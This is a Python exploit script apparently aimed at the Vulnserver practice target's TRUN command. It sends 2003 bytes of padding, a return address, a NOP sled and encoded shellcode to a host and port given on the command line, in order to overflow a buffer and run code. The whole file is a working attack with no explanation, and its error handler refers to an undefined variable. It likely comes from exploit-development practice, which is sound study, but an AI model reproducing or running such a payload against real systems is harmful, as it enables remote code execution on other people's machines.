#!/usr/bin/python
import sys, socket
from time import sleep
from socket import AF_INET, SOCK_STREAM

if len(sys.argv) < 3:
    print("Error: not enough args\nUsage: %s <address> <port>" % sys.argv[0])
    sys.exit()

overflow = ("\xd9\xe8\xbf\x1b\xec\x5f\xae\xd9\x74\x24\xf4\x5e\x31\xc9"
"\xb1\x52\x31\x7e\x17\x83\xc6\x04\x03\x65\xff\xbd\x5b\x65"
"\x17\xc3\xa4\x95\xe8\xa4\x2d\x70\xd9\xe4\x4a\xf1\x4a\xd5"
"\x19\x57\x67\x9e\x4c\x43\xfc\xd2\x58\x64\xb5\x59\xbf\x4b"
"\x46\xf1\x83\xca\xc4\x08\xd0\x2c\xf4\xc2\x25\x2d\x31\x3e"
"\xc7\x7f\xea\x34\x7a\x6f\x9f\x01\x47\x04\xd3\x84\xcf\xf9"
"\xa4\xa7\xfe\xac\xbf\xf1\x20\x4f\x13\x8a\x68\x57\x70\xb7"
"\x23\xec\x42\x43\xb2\x24\x9b\xac\x19\x09\x13\x5f\x63\x4e"
"\x94\x80\x16\xa6\xe6\x3d\x21\x7d\x94\x99\xa4\x65\x3e\x69"
"\x1e\x41\xbe\xbe\xf9\x02\xcc\x0b\x8d\x4c\xd1\x8a\x42\xe7"
"\xed\x07\x65\x27\x64\x53\x42\xe3\x2c\x07\xeb\xb2\x88\xe6"
"\x14\xa4\x72\x56\xb1\xaf\x9f\x83\xc8\xf2\xf7\x60\xe1\x0c"
"\x08\xef\x72\x7f\x3a\xb0\x28\x17\x76\x39\xf7\xe0\x79\x10"
"\x4f\x7e\x84\x9b\xb0\x57\x43\xcf\xe0\xcf\x62\x70\x6b\x0f"
"\x8a\xa5\x3c\x5f\x24\x16\xfd\x0f\x84\xc6\x95\x45\x0b\x38"
"\x85\x66\xc1\x51\x2c\x9d\x82\x9d\x19\xcc\xd2\x76\x58\xee"
"\xc3\xda\xd5\x08\x89\xf2\xb3\x83\x26\x6a\x9e\x5f\xd6\x73"
"\x34\x1a\xd8\xf8\xbb\xdb\x97\x08\xb1\xcf\x40\xf9\x8c\xad"
"\xc7\x06\x3b\xd9\x84\x95\xa0\x19\xc2\x85\x7e\x4e\x83\x78"
"\x77\x1a\x39\x22\x21\x38\xc0\xb2\x0a\xf8\x1f\x07\x94\x01"
"\xed\x33\xb2\x11\x2b\xbb\xfe\x45\xe3\xea\xa8\x33\x45\x45"
"\x1b\xed\x1f\x3a\xf5\x79\xd9\x70\xc6\xff\xe6\x5c\xb0\x1f"
"\x56\x09\x85\x20\x57\xdd\x01\x59\x85\x7d\xed\xb0\x0d\x9d"
"\x0c\x10\x78\x36\x89\xf1\xc1\x5b\x2a\x2c\x05\x62\xa9\xc4"
"\xf6\x91\xb1\xad\xf3\xde\x75\x5e\x8e\x4f\x10\x60\x3d\x6f"
"\x31")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow
try:
    s = socket.socket(AF_INET, SOCK_STREAM)
    s.connect((sys.argv[1], int(sys.argv[2])))
    s.send(('TRUN /.:/' + shellcode))
    s.close()
    sleep(1)
except Exception as e:
    print("Fuzzing crashed at %s bytes :: %s" % (str(len(offset)), str(e)))
    sys.exit()